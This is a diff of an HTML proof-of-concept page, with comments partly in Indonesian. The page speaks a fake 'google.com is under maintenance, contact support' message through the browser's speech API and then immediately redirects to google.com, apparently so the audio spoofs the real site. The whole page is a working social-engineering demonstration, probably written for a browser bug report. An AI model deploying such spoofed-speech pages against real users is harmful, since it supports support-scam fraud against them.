@@ -1,15 +1,14 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Enhanced Speech + Redirect PoC</title>
+<title>SpeechSynthesis Redirect PoC (Controlled)</title>
 <style>
   body {
     font-family: Arial, sans-serif;
-    direction: rtl;
     text-align: center;
-    padding: 50px;
+    padding: 60px;
   }
   button {
     padding: 15px 30px;
@@ -25,8 +24,8 @@
 </head>
 <body>
 
-<h2>اCLICK TO GOOGLE</h2>
-<button id="speechBtn">اCLICK CALL CENTER GOOGLE</button>
+<h2>CLICK TO GOOGLE</h2>
+<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
 <div id="status">Status: Waiting...</div>
 
 <script>
@@ -34,34 +33,35 @@ const btn = document.getElementById('speechBtn');
 const status = document.getElementById('status');
 
 btn.addEventListener('click', () => {
-  const text = "Attention: google.com is still under maintenance. Please visit support or call our help center.";
 
-  if ('speechSynthesis' in window) {
-    const utter = new SpeechSynthesisUtterance(text);
-    utter.lang = 'en-US';
-    
-    const voices = speechSynthesis.getVoices();
-    const enVoice = voices.find(v => v.lang.startsWith('en'));
-    if (enVoice) utter.voice = enVoice;
+  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
 
-    speechSynthesis.speak(utter);
-    console.log("[PoC] Speech started at:", new Date().toLocaleTimeString());
-    status.textContent = "Status: Speech started...";
+  if (!('speechSynthesis' in window)) {
+    status.textContent = "SpeechSynthesis not supported.";
+    return;
   }
 
-  // Countdown sebelum redirect
-  let countdown = 3;
-  const interval = setInterval(() => {
-    status.textContent = `Redirect in ${countdown}...`;
-    console.log(`Redirect in ${countdown}...`);
-    countdown--;
-    if (countdown < 0) {
-      clearInterval(interval);
-      console.log("[PoC] Redirecting now");
-      status.textContent = "Redirecting now...";
-window.location.replace('https://google.com');
-    }
-  }, 200);
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.lang = 'en-US';
+
+  const voices = speechSynthesis.getVoices();
+  const enVoice = voices.find(v => v.lang.startsWith('en'));
+  if (enVoice) utter.voice = enVoice;
+
+  status.textContent = "Preparing redirect...";
+
+  // Redirect cepat
+  setTimeout(() => {
+
+    // Trigger speech tepat sebelum navigasi
+    speechSynthesis.speak(utter);
+    console.log("[PoC] Speech triggered");
+
+    // Navigasi langsung setelah speech dipanggil
+    window.location.replace('https://google.com');
+
+  }, 300); // delay kecil (bisa tweak 100–500ms untuk testing)
+
 });
 </script>
 
